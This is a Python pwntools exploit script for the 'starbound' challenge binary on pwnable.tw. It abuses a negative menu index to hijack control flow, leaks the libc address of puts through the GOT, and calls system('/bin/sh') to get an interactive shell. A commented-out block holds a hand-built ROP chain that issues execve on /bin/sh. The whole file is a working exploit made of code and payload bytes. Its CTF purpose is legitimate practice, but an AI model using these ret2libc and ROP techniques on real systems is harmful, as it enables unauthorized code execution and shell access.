from pwn import *
from time import sleep 

io = process('./starbound_patched', env={"LD_PRELOAD":"./libc_23.so.6"})
elf = ELF('./starbound')
libc = ELF('./libc_23.so.6')
#io = remote('chall.pwnable.tw', 10202)
pl = 0x10c*b'A'+p32(elf.sym['puts'])+p32(elf.sym['main']+18)+p32(elf.got['puts'])

io.sendlineafter(b'> ', b'6')
sleep(1)
io.sendlineafter(b'> ', b'2')
sleep(1)
io.sendafter(b'Enter your name: ', p32(0x080499A6)+b'AAAA')
sleep(1)
io.sendlineafter(b'> ', b'1')
sleep(1)
io.sendlineafter(b'> ', b'-33')
sleep(3)
io.send(pl)
sleep(1)
puts = u32(io.recv(4))
libc.address = puts - libc.sym['puts']
log.info('Libc: '+hex(libc.address))
io.sendlineafter(b'> ', b'-33')
sleep(3)
pl = 0x10c*b'A'+p32(libc.sym['system'])+p32(elf.sym['main']+18)+p32(next(libc.search(b'/bin/sh')))

'''
p = b''
p += p32(libc.address + 0x00001aae) # pop edx ; ret
p += p32(libc.address + 0x001d8040) # @ .data
p += p32(libc.address + 0x00024c1e) # pop eax ; ret
p += b'/bin'
p += p32(libc.address + 0x00075655) # mov dword ptr [edx], eax ; ret
p += p32(libc.address + 0x00001aae) # pop edx ; ret
p += p32(libc.address + 0x001d8044) # @ .data + 4
p += p32(libc.address + 0x00024c1e) # pop eax ; ret
p += b'//sh'
p += p32(libc.address + 0x00075655) # mov dword ptr [edx], eax ; ret
p += p32(libc.address + 0x00001aae) # pop edx ; ret
p += p32(libc.address + 0x001d8048) # @ .data + 8
p += p32(libc.address + 0x0002e565) # xor eax, eax ; ret
p += p32(libc.address + 0x00075655) # mov dword ptr [edx], eax ; ret
p += p32(libc.address + 0x00018c85) # pop ebx ; ret
p += p32(libc.address + 0x001d8040) # @ .data
p += p32(libc.address + 0x001926d5) # pop ecx ; ret
p += p32(libc.address + 0x001d8048) # @ .data + 8
p += p32(libc.address + 0x00001aae) # pop edx ; ret
p += p32(libc.address + 0x001d8048) # @ .data + 8
p += p32(libc.address + 0x0002e565) # xor eax, eax ; ret
p += p32(libc.address + 0x00024c1e) # pop eax ; ret
p += p32(11)
p += p32(libc.address + 0x00002d37)
'''
io.send(pl)
io.interactive()
